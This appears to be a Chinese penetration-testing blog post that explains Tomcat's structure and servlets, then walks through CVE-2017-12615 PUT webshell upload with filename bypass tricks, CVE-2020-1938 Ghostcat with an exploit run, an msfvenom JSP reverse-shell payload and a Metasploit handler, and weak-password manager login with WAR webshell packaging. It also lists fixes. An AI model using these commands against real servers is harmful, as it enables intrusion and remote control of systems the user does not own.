+<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><h3 id="Tomcat学习"><a href="#Tomcat学习" class="headerlink" title="Tomcat学习"></a>Tomcat学习</h3><h4 id="Tomcat与Servlet"><a href="#Tomcat与Servlet" class="headerlink" title="Tomcat与Servlet"></a>Tomcat与Servlet</h4><h5 id="Tomcat-1"><a href="#Tomcat-1" class="headerlink" title="Tomcat"></a>Tomcat</h5><h6 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h6><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930141720152.png" alt="image-20200930141720152"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">* bin       :tomcat的执行的文件.</span><br><span class="line">* conf      :tomcat的配置文件.</span><br><span class="line">* lib       :tomcat运行的需要的jar包.</span><br><span class="line">* logs      :tomcat的运行的日志文件.</span><br><span class="line">* temp      :tomcat产生临时文件存放的路径.</span><br><span class="line">* webapps   :tomcat发布的web项目的路径.</span><br><span class="line">* work      :tomcat运行JSP的时候,JSP翻译成Servlet的代码存放的路径.</span><br></pre></td></tr></table></figure>
+
+<h6 id="Tomcat发布项目"><a href="#Tomcat发布项目" class="headerlink" title="Tomcat发布项目"></a>Tomcat发布项目</h6><ul>
+<li><p>将编写并编译好的web项目(注意要是编译好的，如果是 eclipse，可以将项目打成 war 包放入)，放入到 webapps 中。</p>
+<p>在浏览器输入：<code>http://localhost:8080/</code>项目名/访问的文件名。</p>
+</li>
+<li><p>打开tomcat下conf/server.xml，在<code>&lt;Host&gt; &lt;/Host&gt;</code>标签之间输入项目配置信息</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context path&#x3D;&quot;&#x2F;WebProject&quot; docBase&#x3D;&quot;D:&#x2F;WebProject&quot; reloadable&#x3D;&quot;true&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>path:浏览器访问时的路径名</p>
+<p>docBase:web项目的WebRoot所在的路径，注意是WebRoot的路径，不是项目的路径。其实也就是编译后的项目</p>
+<p>reloadble:设定项目有改动时，tomcat是否重新加载该项目</p>
+<p>浏览器访问</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:8080&#x2F;WebProject&#x2F;HelloTomcat.jsp</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>进入到 apache-tomcat-7.0.52\conf\Catalina\localhost 目录，新建一个 项目名.xml 文件。</p>
+<p>在 那个新建的 xml 文件中，增加下面配置语句</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;Context  docBase&#x3D;&quot;D:&#x2F;WebProject&quot; reloadable&#x3D;&quot;true&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<p>localhost:8080/xml文件名/访问的文件名。</p>
+</li>
+</ul>
+<p>①、第一种方法比较普通，但是我们需要将编译好的项目重新 copy 到 webapps 目录下，多出了两步操作。</p>
+<p>②、第二种方法直接在 server.xml 文件中配置，但是从 tomcat5.0版本开始后，server.xml 文件作为 tomcat 启动的主要配置文件，一旦 tomcat 启动后，便不会再读取这个文件，因此无法再 tomcat 服务启动后发布 web 项目。</p>
+<p>③、第三种方法是最好的，每个项目分开配置，tomcat 将以\conf\Catalina\localhost 目录下的 xml 文件的文件名作为 web 应用的上下文路径，而不再理会<code> &lt;Context&gt;</code>中配置的 path 路径，因此在配置的时候，可以不写path。</p>
+<h6 id="Tomcat敏感目录"><a href="#Tomcat敏感目录" class="headerlink" title="Tomcat敏感目录"></a>Tomcat敏感目录</h6><h6 id="tomcat-users-xml-用户配置文件"><a href="#tomcat-users-xml-用户配置文件" class="headerlink" title="tomcat-users.xml 用户配置文件"></a>tomcat-users.xml 用户配置文件</h6><p>获取用户账户、密码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">  &lt;role rolename&#x3D;&quot;tomcat&quot;&#x2F;&gt;</span><br><span class="line">  &lt;role rolename&#x3D;&quot;role1&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;tomcat&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;both&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;tomcat,role1&quot;&#x2F;&gt;</span><br><span class="line">  &lt;user username&#x3D;&quot;role1&quot; password&#x3D;&quot;&lt;must-be-changed&gt;&quot; roles&#x3D;&quot;role1&quot;&#x2F;&gt;</span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="servlet"><a href="#servlet" class="headerlink" title="servlet"></a>servlet</h5><h6 id="tomcat和servlet的关系"><a href="#tomcat和servlet的关系" class="headerlink" title="tomcat和servlet的关系"></a>tomcat和servlet的关系</h6><p>Tomcat 是Web应用服务器,是一个Servlet/JSP容器. Tomcat 作为Servlet容器,负责处理客户请求,把请求传送给Servlet,并将Servlet的响应传送回给客户.而Servlet是一种运行在支持Java语言的服务器上的组件. Servlet最常见的用途是扩展Java Web服务器功能,提供非常安全的,可移植的,易于使用的CGI替代品.</p>
+<p>从http协议中的请求和响应可以得知，浏览器发出的请求是一个请求文本，而浏览器接收到的也应该是一个响应文本。但是在上面这个图中，并不知道是如何转变的，只知道浏览器发送过来的请求也就是request，我们响应回去的就用response。</p>
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930152555870.png" alt="image-20200930152555870"></p>
+<p>①：Tomcat将http请求文本接收并解析，然后封装成HttpServletRequest类型的request对象，所有的HTTP头数据读可以通过request对象调用对应的方法查询到。</p>
+<p>②：Tomcat同时会要响应的信息封装为HttpServletResponse类型的response对象，通过设置response属性就可以控制要输出到浏览器的内容，然后将response交给tomcat，tomcat就会将其变成响应文本的格式发送给浏览器　</p>
+<p>Java Servlet API 是Servlet容器(tomcat)和servlet之间的接口，它定义了serlvet的各种方法，还定义了Servlet容器传送给Servlet的对象类，其中最重要的就是ServletRequest和ServletResponse。所以说我们在编写servlet时，需要实现Servlet接口，按照其规范进行操作。</p>
+<h6 id="web-xml中servlet配置及其含义"><a href="#web-xml中servlet配置及其含义" class="headerlink" title="web.xml中servlet配置及其含义"></a>web.xml中servlet配置及其含义</h6><p>要从浏览器访问Java servlet，必须告诉servlet容器要部署哪些servlet以及要将servlet映射到哪个URL。 这是在Java Web应用程序的web.xml文件中完成的。</p>
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200930152001965.png" alt="image-20200930152001965"></p>
+<p>首先浏览器通过<a target="_blank" rel="noopener" href="http://localhost:8080/test01/MyServlet%E6%9D%A5%E6%89%BE%E5%88%B0web.xml%E4%B8%AD%E7%9A%84url-pattern%EF%BC%8C%E8%BF%99%E5%B0%B1%E6%98%AF%E7%AC%AC%E4%B8%80%E6%AD%A5%EF%BC%8C%E5%8C%B9%E9%85%8D%E5%88%B0%E4%BA%86url-pattern%E5%90%8E%EF%BC%8C%E5%B0%B1%E4%BC%9A%E6%89%BE%E5%88%B0%E7%AC%AC%E4%BA%8C%E6%AD%A5servlet%E7%9A%84%E5%90%8D%E5%AD%97MyServlet%EF%BC%8C%E7%9F%A5%E9%81%93%E4%BA%86%E5%90%8D%E5%AD%97%EF%BC%8C%E5%B0%B1%E5%8F%AF%E4%BB%A5%E9%80%9A%E8%BF%87servlet-name%E6%89%BE%E5%88%B0%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%8C%E5%88%B0%E4%BA%86%E7%AC%AC%E4%B8%89%E6%AD%A5%EF%BC%8C%E4%B9%9F%E5%B0%B1%E8%83%BD%E5%A4%9F%E7%9F%A5%E9%81%93servlet%E7%9A%84%E4%BD%8D%E7%BD%AE%E4%BA%86%E3%80%82%E7%84%B6%E5%90%8E%E5%88%B0%E5%85%B6%E4%B8%AD%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F%E8%BF%9B%E8%A1%8C%E5%A4%84%E7%90%86%E3%80%82">http://localhost:8080/test01/MyServlet来找到web.xml中的url-pattern，这就是第一步，匹配到了url-pattern后，就会找到第二步servlet的名字MyServlet，知道了名字，就可以通过servlet-name找到第三步，到了第三步，也就能够知道servlet的位置了。然后到其中找到对应的处理方式进行处理。</a></p>
+<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><h4 id="CVE-2017-12615"><a href="#CVE-2017-12615" class="headerlink" title="CVE-2017-12615"></a>CVE-2017-12615</h4><p>影响版本：Apache Tomcat 7.0.0-Apache Tomcat 7.0.81</p>
+<h5 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h5><p>Tomcat PUT方法任意写文件漏洞</p>
+<p>该漏洞可以利用HTTP的PUT方法直接上传webshell到目标服务器，从而获取权限。</p>
+<p>在Tomcat的web.xml默认情况下不存在该漏洞，但是一单开发者或者运维人员手动讲web.xml中的readonly设置为false，可以通过 PUT / DELETE 进行文件操控。</p>
+<p>漏洞的核心错误配置是web.xml中的readonly</p>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">init</span>-param&gt; </span><br><span class="line">&lt;param-name&gt;<span class="keyword">readonly</span>&lt;/param-name&gt; </span><br><span class="line">&lt;param-<span class="keyword">value</span>&gt;<span class="literal">true</span>&lt;/param-<span class="keyword">value</span>&gt; </span><br><span class="line">&lt;/<span class="keyword">init</span>-param&gt;</span><br></pre></td></tr></table></figure>
+
+<h5 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200611151016949.png" alt="image-20200611151016949"></p>
+<p>访问shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192.168.1.102:8080&#x2F;Shell.jsp?cmd&#x3D;id</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200611151044485.png" alt="image-20200611151044485"></p>
+<h5 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h5><p>win：</p>
+<p>1、利用/shell.jsp::$DATA的方式绕过<br>2、/shell.jsp%20，空格绕过<br>3、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/<br>Linux：<br>1、/shell.jsp/ ， Tomcat在处理文件时会删除最后的/</p>
+<p>漏洞分析</p>
+<ul>
+<li>web.xml配置</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.jasper.servlet.JspServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;fork&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;xpoweredBy&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;load-<span class="keyword">on</span>-startup&gt;<span class="number">3</span>&lt;/load-<span class="keyword">on</span>-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet&gt;</span><br><span class="line">    &lt;servlet-name&gt;<span class="keyword">default</span>&lt;/servlet-name&gt;</span><br><span class="line">    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;debug&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="number">0</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;<span class="keyword">init</span>-param&gt;</span><br><span class="line">        &lt;param-name&gt;listings&lt;/param-name&gt;</span><br><span class="line">        &lt;param-<span class="keyword">value</span>&gt;<span class="literal">false</span>&lt;/param-<span class="keyword">value</span>&gt;</span><br><span class="line">    &lt;/<span class="keyword">init</span>-param&gt;</span><br><span class="line">    &lt;load-<span class="keyword">on</span>-startup&gt;<span class="number">1</span>&lt;/load-<span class="keyword">on</span>-startup&gt;</span><br><span class="line">&lt;/servlet&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;<span class="keyword">default</span>&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;/&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;!-- The mappings <span class="keyword">for</span> the JSP servlet --&gt;</span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line">    &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;</span><br><span class="line">    &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line">    &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;</span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到如果url中有jsp、jspx会使用名字为jsp的servlet，进而调用<code>org.apache.jasper.servlet.JspServlet</code>类</p>
+<p>反之调用默认servlet，进而调用<code>org.apache.catalina.servlets.DefaultServlet</code>。</p>
+<ul>
+<li><p>readonly</p>
+<p>作用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--   readonly            Is this context &quot;read only&quot;, so HTTP           --&gt;</span><br><span class="line">&lt;!--                       commands like PUT and DELETE are               --&gt;</span><br><span class="line">&lt;!--                       rejected?  [true]                              --&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>关键</p>
+<p>配置文件中主要定义了default servlet 和 JSP servlet两个servlet，DefaultServlet的作用是处理静态文件 ，JspServlet 的作用是处理jsp 与jspx 文件的请求，同时DefaultServlet 可以处理 PUT 或 DELETE请求。</p>
+<p> 可以看出即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，PUT的代码实现只存在于DefaultServlet中。</p>
+</li>
+</ul>
+<p>漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。上传jsp文件但是让他DefaultServlet来处理他。、</p>
+<h5 id="防御方式"><a href="#防御方式" class="headerlink" title="防御方式"></a>防御方式</h5><ul>
+<li>使用tomcat8及以上版本</li>
+<li>在web.xml文件中将readonly参数删掉，或者将readonly参数设置为true</li>
+</ul>
+<h4 id="CVE-2020-1938"><a href="#CVE-2020-1938" class="headerlink" title="CVE-2020-1938"></a>CVE-2020-1938</h4><p>影响版本</p>
+<p>Apache Tomcat 9.x &lt; 9.0.31<br>Apache Tomcat 8.x &lt; 8.5.51<br>Apache Tomcat 7.x &lt; 7.0.100<br>Apache Tomcat 6.x</p>
+<p>Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。</p>
+<p>当ajp URI设置为非jsp路径时，Tomcat会调用DefaultServlet处理，此时会导致web目录任意文件读取漏洞。当ajp URI设置为jsp路径时，Tomcat会调用JspServlet处理，此时会导致JSP文件包含漏洞。</p>
+<h5 id="Web目录任意文件读取漏洞"><a href="#Web目录任意文件读取漏洞" class="headerlink" title="Web目录任意文件读取漏洞"></a>Web目录任意文件读取漏洞</h5><p>长亭扫描器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">➜  xray .&#x2F;xray webscan --url http:&#x2F;&#x2F;127.0.0.1:8080&#x2F; --html-output single-url.html</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200612145955946.png" alt="image-20200612145955946"></p>
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/image-20200612150021877.png" alt="image-20200612150021877"></p>
+<h5 id="任意命令执行"><a href="#任意命令执行" class="headerlink" title="任意命令执行"></a>任意命令执行</h5><p>该漏洞可以任意文件类型解析为jsp，从而达到任意命令执行的效果。但漏洞需要配合文件上传漏洞才可利用，假设目标服务器已经有了一个shell.png，里面内容是执行任意命令，可以执行以下命令得到命令执行结果：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">margine:CVE-2020-1938 margin$ python 2020-10487.py -f &#x2F;shell.png 127.0.0.1 --rce 1</span><br><span class="line">Getting resource at ajp13:&#x2F;&#x2F;127.0.0.1:8009&#x2F;hissec.jsp</span><br><span class="line">----------------------------</span><br><span class="line">root</span><br></pre></td></tr></table></figure>
+
+<p>反弹shell</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;IP LPORT&#x3D;4444 &gt; shell.txt</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use exploit&#x2F;multi&#x2F;handler </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload java&#x2F;jsp_shell_</span><br><span class="line">set payload java&#x2F;jsp_shell_bind_tcp     set payload java&#x2F;jsp_shell_reverse_tcp  </span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set payload java&#x2F;jsp_shell_reverse_tcp </span><br><span class="line">payload &#x3D;&gt; java&#x2F;jsp_shell_reverse_tcp</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lhost 192.168.0.67</span><br><span class="line">lhost &#x3D;&gt; 192.168.0.67</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; set lport 4444</span><br><span class="line">lport &#x3D;&gt; 4444</span><br><span class="line">msf5 exploit(multi&#x2F;handler) &gt; run</span><br><span class="line"></span><br><span class="line">[*] Started reverse TCP handler on 192.168.0.67:4444</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python 2020-10487.py -f &#x2F;shell.txt 127.0.0.1 --rce 1</span><br><span class="line">弱口令</span><br></pre></td></tr></table></figure>
+
+<p>修复方法</p>
+<p>禁用AJP协议</p>
+<blockquote>
+<p>&lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443” /&gt;</p>
+</blockquote>
+<p>将此行注释掉（也可删掉该行）：</p>
+<blockquote>
+<!--<Connectorport="8009" protocol="AJP/1.3"redirectPort="8443" />-->
+</blockquote>
+<p>配置secret来设置AJP协议的认证凭证。</p>
+<p>例如（注意必须将YOUR_TOMCAT_AJP_SECRET更改为一个安全性高、无法被轻易猜解的值）：</p>
+<blockquote>
+<p>&lt;Connector port=”8009”protocol=”AJP/1.3” redirectPort=”8443”address=”YOUR_TOMCAT_IP_ADDRESS” secret=”YOUR_TOMCAT_AJP_SECRET”/&gt;</p>
+</blockquote>
+<h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><h5 id="版本范围："><a href="#版本范围：" class="headerlink" title="版本范围："></a>版本范围：</h5><p>Tomcat版本：8.0</p>
+<h5 id="漏洞原理："><a href="#漏洞原理：" class="headerlink" title="漏洞原理："></a>漏洞原理：</h5><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限。</p>
+<p>在<code>conf/tomcat-users.xml</code>文件中配置用户的权限：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;user username&#x3D;&quot;tomcat&quot; password&#x3D;&quot;tomcat&quot; roles&#x3D;&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>manager-gui 拥有html页面权限</li>
+<li>manager-status 拥有查看status的权限</li>
+<li>manager-script 拥有text接口的权限，和status权限</li>
+<li>manager-jmx 拥有jmx权限，和status权限</li>
+</ul>
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;tomcat-users xmlns=<span class="string">&quot;http://tomcat.apache.org/xml&quot;</span></span><br><span class="line">              xmlns:xsi=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="line">              xsi:schemaLocation=<span class="string">&quot;http://tomcat.apache.org/xml tomcat-users.xsd&quot;</span></span><br><span class="line">              version=<span class="string">&quot;1.0&quot;</span>&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-script&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-jmx&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;manager-status&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-gui&quot;</span>/&gt;</span><br><span class="line">    &lt;role rolename=<span class="string">&quot;admin-script&quot;</span>/&gt;</span><br><span class="line">    &lt;user username=<span class="string">&quot;tomcat&quot;</span> password=<span class="string">&quot;tomcat&quot;</span> roles=<span class="string">&quot;manager-gui,manager-script,manager-jmx,manager-status,admin-gui,admin-script&quot;</span> /&gt;</span><br><span class="line">    </span><br><span class="line">&lt;/tomcat-users&gt;</span><br></pre></td></tr></table></figure>
+
+<p>可见，用户tomcat拥有上述所有权限，密码是<code>tomcat</code>。</p>
+<p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p>
+<p>打开tomcat管理页面<code>http://your-ip:8080/manager/html</code>，输入弱密码<code>tomcat:tomcat</code>，即可访问后台：</p>
+<p><img src="https://steady-1302023625.cos.ap-beijing.myqcloud.com/makedown/1.png" alt="img"></p>
+<p>上传war包即可直接getshell。</p>
+<h5 id="war制作"><a href="#war制作" class="headerlink" title="war制作"></a>war制作</h5><ul>
+<li>压缩jsp马然后改为war后缀</li>
+</ul>
+<ul>
+<li><p>war包名字和shell名字一样</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jar cvf shell.war shell.jsp</span><br></pre></td></tr></table></figure>
+
+</li>
+</ul>
+
+      
+    </div>
+    <div class="article-footer">
+      <blockquote class="mt-2x">
+  <ul class="post-copyright list-unstyled">
+    
+    <li class="post-copyright-link hidden-xs">
+      <strong>本文链接：</strong>
+      <a href="http://s1eady.top/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" title="中间件漏洞" target="_blank" rel="external">http://s1eady.top/2019/05/02/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/</a>
+    </li>
+    
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong> 本博客所有文章除特别声明外，均采用 <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CN协议</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+</blockquote>
+
+
+<div class="panel panel-default panel-badger">
+  <div class="panel-body">
+    <figure class="media">
+      <div class="media-left">
+        <a href="https://github.com/cofess" target="_blank" class="img-burn thumb-sm visible-lg">
+          <img src="/images/1.jpg" class="img-rounded w-full" alt="">
+        </a>
+      </div>
+      <div class="media-body">
+        <h3 class="media-heading"><a href="https://github.com/cofess" target="_blank"><span class="text-dark">果冻</span><small class="ml-1x">Penetration Testing</small></a></h3>
+        <div>一往情深深几许。</div>
+      </div>
+    </figure>
+  </div>
+</div>
+
+
+    </div>
+  </article>
+  
+    
+  <section id="comments">
+  	
+      <div id="vcomments"></div>
+    
+  </section>
+
+
+  
+</div>
+
+  <nav class="bar bar-footer clearfix" data-stick-bottom>
+  <div class="bar-inner">
+  
+  <ul class="pager pull-left">
+    
+    <li class="prev">
+      <a href="/2019/05/02/%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F%E6%80%BB%E7%BB%93/" title="源码泄漏"><i class="icon icon-angle-left" aria-hidden="true"></i><span>&nbsp;&nbsp;上一篇</span></a>
+    </li>
+    
+    
+    <li class="next">
+      <a href="/2019/04/09/CTF-%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%982/" title="CTF-流量分析题2"><span>下一篇&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a>
+    </li>
+    
+    
+    <li class="toggle-toc">
+      <a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="文章目录" role="button">
+        <span>[&nbsp;</span><span>文章目录</span>
+        <i class="text-collapsed icon icon-anchor"></i>
+        <i class="text-in icon icon-close"></i>
+        <span>]</span>
+      </a>
+    </li>
+    
+  </ul>
+  
+  
+  <!-- Button trigger modal -->
+  <button type="button" class="btn btn-fancy btn-donate pop-onhover bg-gradient-warning" data-toggle="modal" data-target="#donateModal"><span>赏</span></button>
+  <!-- <div class="wave-icon wave-icon-danger btn-donate" data-toggle="modal" data-target="#donateModal">
+    <div class="wave-circle"><span class="icon"><i class="icon icon-bill"></i></span></div>
+  </div> -->
+  
+  
+  <div class="bar-right">
+    
+    <div class="share-component" data-sites="weibo,qq,wechat,facebook,twitter" data-mobile-sites="weibo,qq,qzone"></div>
+    
+  </div>
+  </div>
+</nav>
+  
+<!-- Modal -->
+<div class="modal modal-center modal-small modal-xs-full fade" id="donateModal" tabindex="-1" role="dialog">
+  <div class="modal-dialog" role="document">
+    <div class="modal-content donate">
+      <button type="button" class="close" data-dismiss="modal" aria-label="Close"><span aria-hidden="true">&times;</span></button>
+      <div class="modal-body">
+        <div class="donate-box">
+          <div class="donate-head">
+            <p>感谢您的支持，我会继续努力的!</p>
+          </div>
+          <div class="tab-content">
+            <div role="tabpanel" class="tab-pane fade active in" id="alipay">
